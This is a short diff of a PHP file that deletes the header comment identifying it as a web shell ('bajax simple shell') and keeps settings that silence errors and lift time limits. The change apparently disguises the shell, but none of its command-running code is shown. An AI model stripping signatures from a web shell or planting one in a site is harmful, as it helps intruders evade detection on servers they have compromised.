@@ -1,10 +1,4 @@
 <?php
-/**
-* bajax simple shell v 1.2.1
-* author wildantea
-* email : wildannudin@gmail.com
-* web   : wildantea.com
-*/
 error_reporting(0);
 session_start();
 @ini_set("max_execution_time",0);
